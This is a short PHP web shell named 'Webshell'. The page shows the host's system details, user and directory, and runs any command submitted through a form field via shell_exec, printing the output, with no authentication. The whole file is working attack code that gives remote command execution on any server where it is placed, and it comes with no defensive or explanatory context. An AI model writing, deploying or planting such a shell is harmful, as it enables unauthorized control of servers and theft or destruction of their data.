<?php
    $NAME = "Webshell";
    $CURRENT_DEVICE = shell_exec("uname -a");
    $CURRENT_USER = shell_exec("whoami");
    $CURRENT_DIR = shell_exec("pwd");
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo $NAME; ?></title>
    </head>
    <body>
        <h1><?php echo $NAME; ?></h1>
        <div>
            Device: <?php echo $CURRENT_DEVICE; ?><br>
            Current user: <?php echo $CURRENT_USER; ?><br>
            Current directory: <?php echo $CURRENT_DIR; ?><br>
        </div>

        <?php
            if(isset($_POST["sh"]))
                $CMD = shell_exec($_POST["sh"]." 2>&1");
        ?>

        <form method="post" action="<?php htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
            <input type="text" name="sh" autocomplete="off" autofocus>
            <input type="submit" value="Run">
        </iframe>

        <pre><?php echo $CMD; ?></pre>
    </body>
</html>